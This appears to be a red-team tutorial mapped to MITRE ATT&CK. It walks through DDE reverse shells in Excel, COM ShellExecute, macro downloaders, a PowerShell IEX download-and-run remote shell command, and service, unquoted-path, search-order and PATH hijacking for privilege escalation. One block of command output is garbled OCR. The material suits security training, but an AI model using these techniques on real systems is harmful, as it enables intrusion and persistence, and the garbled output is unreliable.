Microsoft Office documents can be poisoned with DDE commands, directly or through embedded files, and used to deliver execution via Phishing campaigns or hosted Web content avoiding the use of Visual Basic for Applications (VBA) macros. DDE could be leveraged by adversary operating on compromised machine who does not have access to a Command and Scripting Interpreter

Windows Dynamic Data Exchange (DDE) is a client-server protocol for one-time and/or continuous inter-process communication (IPC) between applications. Once a link is established, applications can autonomously exchange transactions consisting of string, warm data links (notifications when a data item changes), hot data links (duplications of changes to a data item), and requests for command execution.

Example:

In the following example will setup a simple DDE command that will use PowerShell to execute a Nishang Reverse Shell that will connect back to my attacker machine.

**As of 2017 some products don't support DDE no more, but Excel and Outlook do still by default**

I will open a new excel spreadsheet and type the syntax into the formula box on the A1 cell

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhCnu_yN10LczBtpLe%2F-MRhDOw31SW4BM2BluQr%2Fimage.png?alt=media&token=ff041d48-2ef8-4ba5-84ff-912b4d5bcfa8)

On the formula field we will write the following syntax. If you receive a formula error it will usually highlight where the error is located.

Command

With this we save and re-open the File, we will have a server running and a listener on our attacking machine to receive the connection back to us.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhCnu_yN10LczBtpLe%2F-MRhDPpw-AlFoC4aVReP%2Fimage.png?alt=media&token=ad76291c-a461-41fd-a5d1-9a5cb365902d)

Once the user opens the file an Update button and a Security Warning will be shown on the upper section of the spreadsheet

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhCnu_yN10LczBtpLe%2F-MRhDQloEvyxIKOk55ii%2Fimage.png?alt=media&token=aa415252-dc9f-45b6-8033-f3c279e7cf2b)

Once the update is accepted a second prompt will be shown for trusting the external resource.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhCnu_yN10LczBtpLe%2F-MRhDRWvX8ImeDzQENiJ%2Fimage.png?alt=media&token=c0461768-197c-4a02-8eb4-b6643da6f66e)

Click Yes and we see our code ran successfully and we receive a connection back to our machine

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhCnu_yN10LczBtpLe%2F-MRhDSJSmi6jc5zbHkhR%2Fimage.png?alt=media&token=3ff88cda-854e-4c13-ba28-4d1509795805)

Demo:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhCnu_yN10LczBtpLe%2F-MRhDTxzCzAEzv-uSOdh%2FDDE-Sample.gif?alt=media&token=dc618c14-a980-462e-a2e4-ed0357789e0d)

### component-object-model

Adversaries may use the Windows Component Object Model (COM) for local code execution. COM is an inter-process communication (IPC) component of the native Windows application programming (API) that enables interaction between software objects, or executable code that implements one or more interfaces. Through COM, a client object can call methods of server objects, which are typically binary Dynamic Link Libraries (DLL) or executables (EXE).

Various COM interfaces are exposed that can be abused to invoke arbitrary execution via a variety of programming languages such as C, C++, Java, and Visual Basic. Specific COM objects also exist to directly perform functions beyond code execution, such as creating a Scheduled Task/Job, file less download/execution, and other adversary behaviors related to privilege escalation and persistence.

Blog:

​

[https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/

https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html

[https://www.fireeye.com/blog/threat-research/2019/06/hunting-com-objects.html](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)

*Some small edits need to be applied as a IP address is always given for Lateral Movement but by removing this we can execute locally

Examples:

First we start by searching some COM Objects available and that can allows us to Execute code on the local machine. PowerShell is a great way to enumerate some COM objects and find one that has a proper method to execute code.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhCnu_yN10LczBtpLe%2F-MRhD2Aw1F4Pf6-N3bFa%2Fimage.png?alt=media&token=6d35f9ad-af01-4780-b5b6-8a7efa86ed75)

So with some proper enumeration and some testing we can actually execute find by finding a proper COM Object that contains a method that will allows us to execute code.

Now in this example we will use an already known COM Object ShellWindows and using it ShellExecute Method

Let us instantiate the object by using the CLSID we can use the Type.GetTypeFromCLSID paired with the Activator.CreateInstance mathod you will need the CLSID of the object to do this correctly

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhCnu_yN10LczBtpLe%2F-MRhD34UADLQiAkXgAr_%2Fimage.png?alt=media&token=09046d2f-ddff-499f-9c41-9e83dd6e5a77)

Now we can execute and invoke any methods we want but we want to achieve actual interaction with the host so from here we access the WindowsShell.Item method.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhCnu_yN10LczBtpLe%2F-MRhD44q9CG9gqGU46r-%2Fimage.png?alt=media&token=908b9a40-ae34-4f3f-a68f-0d6bd2b07fdf)

When going through all the methods and doing the proper research a method that stood out was "Document.Application.ShellExecute"

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhCnu_yN10LczBtpLe%2F-MRhD4sgpxCOGZa2qzhq%2Fimage.png?alt=media&token=dd6dff9a-d11e-4420-8e50-c2696011f0d6)

Demo:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhCnu_yN10LczBtpLe%2F-MRhD7ThyA_6diUU5RlO%2FCOM-Sample.gif?alt=media&token=6c0b06fa-08ee-4e1e-ba37-0de180dd089e)

## t1203-exploitation-for-client-execution

Adversaries may exploit software vulnerabilities in client applications to execute code. Vulnerabilities can exist in software due to unsecure coding practices that can lead to unanticipated behavior. Adversaries can take advantage of certain vulnerabilities through targeted exploitation for the purpose of arbitrary code execution. Oftentimes the most valuable exploits to an offensive toolkit are those that can be used to obtain code execution on a remote system because they can be used to gain access to that system. Users will expect to see files related to applications they commonly used to do work , so they are a useful target for exploit research and development because of their high utility.

Several types exist:

**Browser-based Exploitation**

Web browsers are a common target through Drive-by Compromise and Spearphishing Link. Endpoint systems may be compromised through normal web browsing or from certain users being targeted by links in spearphishing mails to adversary controlled sites used to exploit the web browser. These often do not require an action by the user for the exploit to be executed.

**Office Applications**

Common office and productivity applications such as Microsoft Office are also targeted through Phishing. Malicious files will be transmitted directly as attachments or through links to download them. These require the user to open the document or file for the exploit to run.

**Common Third-party Applications**

Other applications that are commonly seen or are part of the software deployed in a target network may also be used for exploitation. Applications such as Adobe Reader and Flash, which are common in enterprise environments, have been routinely targeted by adversaries attempting to gain access to systems. Depending on the software and nature of the vulnerability, some may be exploited in the browser or require the user to open a file. For instance, some Flash exploits have been delivered as objects within Microsoft Office documents.

### common-third-party-applications

Wow so Empty

### office-applications

**Office Applications**

Macros in this example I will show the simple use of Macros to Execute a Shell in this technique it will work as a downloader to call our payload and then Execute, while it cleans up on its own leaving no files on the System

Example:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhC2YKz5efxHz0u50m%2F-MRhCQScms1IX9kZyS1a%2Fimage.png?alt=media&token=b8206d20-8d19-4581-8616-d74543ae9f52)

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhC2YKz5efxHz0u50m%2F-MRhCN_Zdh_71zHZ6mb6%2Fimage.png?alt=media&token=0af6d936-807a-462d-8542-703bfcdaf73a)

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhC2YKz5efxHz0u50m%2F-MRhCOlQwll-oMoyeC32%2Fimage.png?alt=media&token=73c974fe-33bd-4856-916b-3ae3f41e7eab)

Shell:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhC2YKz5efxHz0u50m%2F-MRhCPSu4BNBu9bEltZp%2Fimage.png?alt=media&token=b6a4bb4d-7c92-42ed-81ff-61dba44d4cbf)

Please Ignore my multiple tries

## t1059-command-and-scripting-interpreter

Adversaries may abuse command and script interpreters to execute commands, scripts, or binaries. These interfaces and languages provide ways of interacting with computer systems and are common features across many different platforms. Most systems come with some built-in command-line interface and scripting capabilities, for example, macOS and Linux distributions include some flavor of Unix Shell while Windows installations include the Windows Command Shell and PowerShell.

There are also cross-platform interpreters such as Python, as well as those commonly associated with client applications such as JavaScript/Jscript and Visual Basic.

Adversaries may abuse these technologies in various ways as means of executing arbitrary commands. Commands and scripts can be embedded in Initial Access payloads delivered to victims as lure documents or as secondary payloads downloaded from an existing C2. Adversaries may also execute commands through interactive terminals/shells.

### network-device-cli

Adversaries may abuse scripting or built-in command line interpreters (CLI) on network devices to execute malicious command and payloads. The CLI is the primary means through which users and administrators interact with the device in order to view system information, modify device operations, or perform diagnostic and administrative functions. CLIs typically contain various permission levels required for different commands.

Scripting interpreters automate tasks and extend functionality beyond the command set included in the network OS. The CLI and scripting interpreter are accessible through a direct console connection, or through remote means, such as telnet or secure shell (SSH).

Adversaries can use the network CLI to change how network devices behave and operate. The CLI may be used to manipulate traffic flows to intercept or manipulate data, modify startup configuration parameters to load malicious system software, or to disable security features or logging to avoid detection.

**No Examples the need of a Network Device with Command-Line like Cisco Routers is enough to know**

### javascript-jscript

Adversaries may abuse JavaScript and/or JScript for execution. JavaScript (JS) is a platform-agnostic scripting language (compiled just-in-time at runtime) commonly associated with scripts in webpages, though JS can be executed in runtime environments outside the browser.

Jscript is the Microsoft implementation of the same scripting standard. JScript is interpreted via the Windows Script engine and thus integrated with many components of Windows such as the Component Object Model and Internet Explorer HTML Application (HTA) pages.

Adversaries may abuse JavaScript / Jscript to execute various behaviors. Common uses include hosting malicious scripts on websites as part of a Drive-by Compromise or downloading and executing these script files as secondary payloads. Since the payloads are text-based, it is also very common for adversaries to obfuscate their content as part of Obfuscated Files or Information.

Example:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhBmr1KRO04w0lM1Ec%2F-MRhBu2e4WPwjUPcm_sx%2Fimage.png?alt=media&token=cb52ce99-3019-45dc-a0cc-4f2b458a752f)

### python

Adversaries may abuse Python commands and scripts for execution. Python is a very popular scripting/programming language, with capabilities to perform many functions. Python can be executed interactively from the command-line (via the python.exe interpreter) or via scripts (.py) that can be written and distributed to different systems. Python code can also be compiled into binary executables.

Python comes with many built-in packages to interact with the underlying system, such as file operations and device I/O. Adversaries can use these libraries to download and execute commands or other scripts as well as perform various malicious behaviors.

Python a Programming/Scripting Language common in the infosec community some great and powerful tools have been published using the language (Impacket, cough* cough*). Currently in its version 3 it is great for infosec this can also execute on Windows meeting certain requirements of course having Python being installed, and Linux the majority of the distributions come with it as a Default.

Examples (Unix):

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhAIvKacb-RzsncVfy%2F-MRhBlYoVLdzYANfrObi%2Fimage.png?alt=media&token=49bccaa4-c79a-4450-b210-bd78b6121616)

This is also a great offensive tool some sites (pentestmonkey) contain some great examples of 1liner shells to execute with certain languages an Python is no exception as it has an option as well.

### visual-basic

Adversaries may abuse Visual basic (VB) for execution. VB is a programming language created by Microsoft with interoperability with many Windows technologies such as Component Object Model and the Native API through the Windows API. Although tagged as legacy with no planned future evolutions, VB is integrated and supported in the .NET Framework and cross-platform .NET Core.

Derivative languages based on VB have also been created, such as Visual Basic for Applications (VBA) and VBScript. VBA is an event-driven programming language built into Microsoft Office, as well as several third-party applications. VBA enables documents to contain macros used to automate the execution of tasks and other functionality on the host. VBScript is a default scripting language on Windows hosts and can also be used in place of JavaScript/Jscript on HTML Application (HTA) webpages served to internet Explorer (though most modern browsers do not come with VBScript support).

Adversaries may use VB payloads to execute malicious commands. Common malicious usage includes automating execution of behaviors with VBScript or embedding VBA content into Spearphishing Attachment payloads.

Example:

Here is an Example from a VBScript that Executes on the Machine and Outputs info about the User and the PC, here we have 2 options to execute CSCRIPT and WSCRIPT both work fine but one is a console output and the other is a window output

CSCRIPT.EXE:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhAIvKacb-RzsncVfy%2F-MRhBZGDgyH9gcqNNwmb%2Fimage.png?alt=media&token=c6d22e74-2efc-4200-a1be-020eb6c7ac96)

WSCRIPT.EXE:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhAIvKacb-RzsncVfy%2F-MRhB_7zfSyCfSnNg3C-%2Fimage.png?alt=media&token=b6b57916-7a1c-4f65-838d-8a38a3353065)

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhAIvKacb-RzsncVfy%2F-MRhB_rW2SGmtuWvr66P%2Fimage.png?alt=media&token=6e2ee697-ce11-44b0-ad35-0a1c855752b4)

The user can also Double-Click and have the file execute, it will default to WSCRIPT.

### unix-shell

Adversaries may abuse Unix Shell commands and scripts for execution. Unix shells are the primary command prompt on Linux and macOS systems, though many variations of the Unix shell exist (e.g. sh, bash, zsh, etc) depending on the specific OS or distribution. Unix shells can control every aspect of a system, with certain commands requiring elevated privileges.

Unix shells also support scripts that enable sequential execution of commands as well as other typical programming operations such as conditionals and loops. Common uses of shell scripts include long or repetitive tasks, or the need to run the same set of commands on multiple systems.

Adversaries may abuse Unix shells to execute various commands or payloads. Interactive shells may be accessed through command and control channels or during lateral movement such as with SSH. Adversaries may also leverage shell scripts to deliver and execute multiple commands on victims or as part of payloads used for persistence

Unix Terminal is a very powerful interface for the Unix systems it is well known in the Offensive and Defensive industry it is more common with Linux Users as it is the most preferred way for Linux users to interact with the system.

Shell:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhAIvKacb-RzsncVfy%2F-MRhBQUC_BS_U73NvzD7%2Fimage.png?alt=media&token=b5f0ea04-f777-4a51-b9ae-cef1a3e8e2ca)

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhAIvKacb-RzsncVfy%2F-MRhBRLYRre98A7IKjuf%2Fimage.png?alt=media&token=aabc9de1-4947-4456-9154-de0ceb600673)

Executing a Script:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhAIvKacb-RzsncVfy%2F-MRhBSBxMQmeaqe3qqne%2Fimage.png?alt=media&token=031b48f6-5fda-4c09-a813-2962a7d709a1)

A simple Script that echo's back "Hello World" in the BASH Scripting Language

### windows-command-shell

Adversaries may abuse the Windows command shell for execution. The windows command shell (cmd.exe) is the primary command prompt on Windows systems. The Windows command prompt can be used almost any aspect of a system, with various permission levels required for different subsets of commands.

Batch files (ex: .bat or .cmd) also provides the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.

Adversaries may leverage cmd.exe to execute various commands and payloads. Common uses include cmd.exe /c to execute a single command, or abusing cmd.exe interactively with input and output forwarded over a command and control channel.

The Windows Command-Line a powerful interface that has been available since Windows 2000 even though it has some other cousin's such as COMMAND.EXE this is the most common and highly used command-line interface for the Windows Operating Systems

Some Examples:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhAIvKacb-RzsncVfy%2F-MRhBFDtNgqCJJQEy8tH%2Fimage.png?alt=media&token=3c2b4ff1-353b-4765-9a99-f1f0c1cd0a67)

Shell:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhAIvKacb-RzsncVfy%2F-MRhBGtNkYEDaGStnBr1%2Fimage.png?alt=media&token=852e0db7-7039-4e60-9ebb-291fbff3e833)

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhAIvKacb-RzsncVfy%2F-MRhBHbWjx9bYIZGTDq8%2Fimage.png?alt=media&token=3f72382b-3dd8-4643-bcdc-e3645dfc2590)

Also an incredible and powerful way to execute code, bypass, obfuscate same as it's younger brother PowerShell this is a great method to execute code.

### powershell

Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code. Examples included in the Start-Process cmdlet which can be used to run an executable and the Invoke-Command cmdlet which runs command locally or on a remote computer (though administrator permissions are required to use PowerShell to connect to remote systems).

Power Shell may be also used to download and run executables from the internet, which can be executed from disk or in memory without touching disk.

A number of PowerShell-based offensive testing tools are available, including Empire, PowerSploit, PoshC2, and PSAttack.

PowerShell commands/scripts can also be executed without directly invoke the powershell.exe binary through interfaces to PowerShell's underlying System.Management.Automation assembly DLL exposed through the .NET framework and Windows Common Language Interface (CLI).

Some Examples of the PowerShell Command-Line

Whoami, hostname, PWD (Current Directory)

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2Fred-team-notes-2-0%2F-MRhAIvKacb-RzsncVfy%2F-MRhB0wXBz8Y1yx0jG63%2F0.png?generation=1611370865321257&alt=media)

ComputerInfo

Windows PowerSheII 
PS C: Get-computerlnfo 
Wi ndowsBui 1 dL abEx 
Wi ndowscurrentversion 
Wi ndowsEdi ti onld 
Wi ndowslns tal 1 ati onType 
Wi ndowslns tal 1 DateF romRegi s try 
Wi ndowsproductld 
Wi ndowsp roductName 
Wi ndows Regi s te redo rgani zati on 
Wi ndows Regi s te redowner 
Wi ndows Sys temRoot 
Wi ndowsversi on 
Bi oscharacteri sti cs 
Bi os BIOSVersi on 
Bi osBui 1dNumber 
Bi oscapti on 
Bi oscodeset 
Bi osCurrentL anguage 
Bi os Description 
Bi os Embeddedcontrol 1 erMaj orVers i on 
Bi os Embeddedcontrol 1 e rMi norVers i on 
Bi osFi rmwareType 
Bi os Identi fi cati oncode 
Bi oslns tal 1 abl eL anguages 
Bi oslnstal 1 Date 
Bi os L anguageEdi ti on 
Bi osLis tofL anguages 
BiosManufacturer 
Bi os Name 
. 19041.1. amd64fre. vb 
. 6.3 
Enterprise 
Client 
_rel ease. 191206-1406 
. 11/4/2020 AM 
. 00329-00000-00003-AA731 
Windows 10 Enterprise 
Adri an 
C: ndows 
. 2009 
. {4, 7, 15, 16...} 
{VBOX 
Default System BIOS 
Default System BIOS 
. 110 
. 111 
Bios 
innotek GmbH 
Default System BIOS 

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2Fred-team-notes-2-0%2F-MRhAIvKacb-RzsncVfy%2F-MRhB0wYu4H_7qUpbTo7%2F1.png?generation=1611370865292803&alt=media)

What about grabbing a Remote Shell, well we will use the common IEX Command to achieve that.

Windows PowerSheII 
PS C: nchester.DC> IEX (New-object Net. Webclient) . Downloadstring( 

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2Fred-team-notes-2-0%2F-MRhAIvKacb-RzsncVfy%2F-MRhB0wZuUTvhPAl9Bjl%2F2.png?generation=1611370865292819&alt=media)

Shell:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2Fred-team-notes-2-0%2F-MRhAIvKacb-RzsncVfy%2F-MRhB0w_JGUZ9oerSmEG%2F3.png?generation=1611370865301493&alt=media)

PowerShell is a powerful interface and there are many offensive tools that take advantage of its capabilities do challenge yourself to find them out in the offensive side of things.

# persistence

The Adversary is trying to maintain their foothold.

Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. Techniques used for persistence include any access, action, or configuration changes that let them maintain their foothold on systems, such as replacing or hijacking legitimate code or adding startup code.

## t1574-hijack-execution-flow

Adversaries may execute their own malicious payloads by hijacking the way operating systems run programs. Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time. Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution.

There are many ways an adversary may hijack the flow of execution, including by manipulating how the operating system locates programs to be executed. How the operating locates libraries to be used by a program can also be intercepted. Locations where the operating system looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads.

### service-file-permissions-weakness

Adversaries may execute their own malicious payloads by hijacking the binaries used by services. Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start. These service processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.

Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.

**Example:**

In this situation a user has PERMISSIONS to designate or modify one of the services run by SYSTEM in this situation we see a normal service already stopped, in this example its Ccleaner, also info on the BinPath that shows where the binary is located in the Windows System.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhZCa9uuvGts_bAsRX%2Fimage.png?alt=media&token=7b736ea1-bf89-4ed5-81e8-959e75f476db)

What if a User has permissions to change this binPath?, simple it can have it point to the malicious payload and when this services is started it will run the malicious payload.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhZDKx-CN1i181Xm2c%2Fimage.png?alt=media&token=97fe0137-fb56-41a0-b8fe-370cce449535)

Same Result but a more simpler configuration modification.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhZE6SCHGhjEXKDCKL%2Fimage.png?alt=media&token=1ca147da-b197-4e06-9a3b-2244b98b7c28)

### path-interception-by-unquoted-path

Adversaries may execute their ow malicious payloads by hijacking vulnerable path references. Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch.

Service paths and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (e.g., C:\unsafe path with space\program.exe vs. "C:\unsafe path with pace\program.exe"). (stored in Windows Registry Keys)An adversary can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable. For example, if the path in a shortcut is C:\program files\myapp.exe, an adversary may create a program at C:\program.exe that will be run instead of the intended program.

This technique can be used for persistence if executables are called on a regular basis, as well as privilege escalation if intercepted executables are started by higher privileged process.

**Example:**

A very popular and well known technique usually some software have very minor but important configurations missing for example Quoting ("") a full path of a file or binary, we are aware that Windows has some folders that contain spaces in them (C:\Program Files\) and these folders or paths without a quote windows sees them as an End Line where that is a termination of a file name, here is the reason why it's necessary to quote the path so windows sees it as a complete path when a space(" ") is in the path name.

It's important to have these quoted paths since windows will not find the assigned file or binary when doing its search when a service is started, in this situation an attacker can take advantage of this and add a malicious payload on a path that come's before the intended one.

A very great tool that I recently have found and its output is very clean is 

**PrivescCheck.**

The output is user friendly and it even has an Highlighted section at the end of its run that puts everything tidied up for you so you can find the vulnerability.

Sample:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhZ3YHHB0SayS_cfGQ%2Fimage.png?alt=media&token=0168b3cc-906e-408a-a8f3-ecea261e10f2)

So let us pay attention to the Unquoted Path Result

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhZ4NOIn_9IESWVIsg%2Fimage.png?alt=media&token=e001c3e3-ad22-49ce-9d6e-73486c453985)

Look at this Ccleaner is Unquoted and it’s a Service where the Path is Modifiable but we see that the C:\ Path is WRTIE accessible. But unfortunately as a User we don't have permissions to Start or Restart so what best option do we have, well I wouldn't call these Ethical but we can probably Crash the OS and have a force reboot ONLY if it's not possible to Restart as a User. But here for the sake of Demonstration I will Restart it as the Administrator and have my Payload executed.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhZ59KnQkuIE-qzfN5%2Fimage.png?alt=media&token=37bf07cb-9353-4635-bf4a-c4245d871290)

### path-interception-by-search-order-hijacking

Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the operating system to launch their malicious software at the request of the calling program.

Search order hijacking occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike DLL Search Order hijacking, the search order differs depending on the method that is used to execute the program. However, it is common for Windows to search in the directory of the initiating program before searching through the Windows System directory. An adversary who finds a program vulnerable to search order hijacking(i.e., a program that does not specify the path to an executable) may take advantage of this vulnerability by creating a program named after the improperly specified program and placing it within the initiating program's directory.

For example, "example.exe" runs "cmd.exe" with the command-line argument net user. An adversary may place a program called "net.exe" within the same directory as example.exe, "net.exe" will be run instead of the Windows system utility net. In addition, if an adversary places a program called "net.com" in the same directory as "net.exe", then cmd.exe /C net users will execute "net.com" instead of "net.exe" due to the order of executable extensions defined under PATHEXT.

Search order hijacking is also common practice for hijacking DLL loads.

**Example:**

So in this example I created a simple C++ example.exe application which calls net.exe and uses the arguments 

**net users.**

This application is vulnerable to Search order Hijacking as since the program net.exe is not called with it's full path Windows is Searching for the program in its predetermined order that I have mentioned previously, take a look at the code:

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhYpduR8Vr-oTgM8LO%2Fimage.png?alt=media&token=3f932934-ff0b-4ee5-9e66-634e5a224b7a)

I will execute example.exe in a regular directory where there is no malicious hijacking.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhYqSMqAVFXzccbJ_M%2Fimage.png?alt=media&token=7f3b4ec8-3763-41aa-ba84-1c06a041fd87)

As you can see above the child processes from Example it called net.exe and windows found it in the %SystemRoot% Path.

So what happens when the program is called in a directory where there is a similar program named net.exe but it is actually our malicious payload?.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhYrP9Wb8NoHkYlq3D%2Fimage.png?alt=media&token=ea553c4f-7bcf-4b97-a716-6e27b3ac09c3)

We can see it found our malicious payload that executes calc.exe and it runs that one instead, since one of the first paths it usually takes before finding it in C:\Windows\System32 is the current working directory.

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhYuO0WNJWkdu214MC%2Fimage.png?alt=media&token=a025b915-1ca5-4445-9b38-f295943d83aa)

Calc.exe is executed instead.

### path-interception-by-path-environment-variable

Adversaries may execute their own malicious payloads by hijacking environment variables used to load libraries. Adversaries may place a program in an earlier entry in the list of directories stored in the PATH environment variable, which Windows will then execute when it searches sequentially through that PATH listing in search of the binary that was called form a script or the command line.

The PATH environment variable contains a list of directories. Certain methods of executing a program (namely using cmd.exe or the command-line) rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given. If any directories are listed in the PATH environment variable before the Windows directory %SystemRoot%\System32 (e.g.: C:\Windows\System32), a program may be placed in the preceding directory that is named the same as a Windows program (such as cmd, PowerShell, or python), which will be executed when that command is executed from a script or command-line.

For example, if C:\example Path precedes C:\Windows\System32 is in the PATH environment variable, a program that is named net.exe and placed in C:\example Path will be called instead of the Windows system "net"  when "net" is executed from the command-line.

**Example:**

It's possible to abuse the %Path% variable environment variable to elevate privileges as long as the user has permissions to (W) Write and it comes 

**BEFORE**

 C:\Windows\System32.

By using the 

**set path=**

  we can set the path we have control of.

Let us check our PATH variable and see how it looks

![](https://2121993737-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-MRh03Vwd4nuiUi3Oje7%2F-MRhPO65wV20KDiTlpyA%2F-MRhYf_6QCOz303gDYui%2Fimage.png?alt=media&token=f65a877d-f796-4c15-84fc-dd557276fac0)

